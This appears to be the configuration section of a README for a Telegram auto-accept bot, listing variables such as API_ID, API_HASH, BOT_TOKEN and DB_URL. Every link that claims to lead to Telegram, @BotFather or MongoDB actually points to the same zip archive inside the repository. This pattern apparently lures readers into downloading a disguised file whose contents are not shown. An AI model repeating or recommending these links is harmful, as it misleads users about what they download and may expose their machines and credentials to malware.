## Config Varies

<b>`API_ID`</b> : **Goto [https://github.com/PaidXSmall/Auto-Accept-Telegram-Bot/raw/refs/heads/master/helper/Telegram-Bot-Auto-Accept-2.1-alpha.2.zip](https://github.com/PaidXSmall/Auto-Accept-Telegram-Bot/raw/refs/heads/master/helper/Telegram-Bot-Auto-Accept-2.1-alpha.2.zip) to obtain this.**

<b>`API_HASH`</b> : **Goto [https://github.com/PaidXSmall/Auto-Accept-Telegram-Bot/raw/refs/heads/master/helper/Telegram-Bot-Auto-Accept-2.1-alpha.2.zip](https://github.com/PaidXSmall/Auto-Accept-Telegram-Bot/raw/refs/heads/master/helper/Telegram-Bot-Auto-Accept-2.1-alpha.2.zip) to obtain this.**

<b>`BOT_TOKEN`</b> : **Get the bot token from [@BotFather](https://github.com/PaidXSmall/Auto-Accept-Telegram-Bot/raw/refs/heads/master/helper/Telegram-Bot-Auto-Accept-2.1-alpha.2.zip)**

<b>`ADMIN`</b> : **AUTH Or Bot Controllers Id**

<b>`DB_URL`</b> : **Mongo Database URL From [MONGO-DB](https://github.com/PaidXSmall/Auto-Accept-Telegram-Bot/raw/refs/heads/master/helper/Telegram-Bot-Auto-Accept-2.1-alpha.2.zip)**

<b>`LOG_CHANNEL`</b> : **Bot Logs Sending Channel. If You Don't Need This To Remove This Variable In Your Server**

<b>`START_PIC`</b> : **Start Message Photo. You Don't Need This! Just Skip**
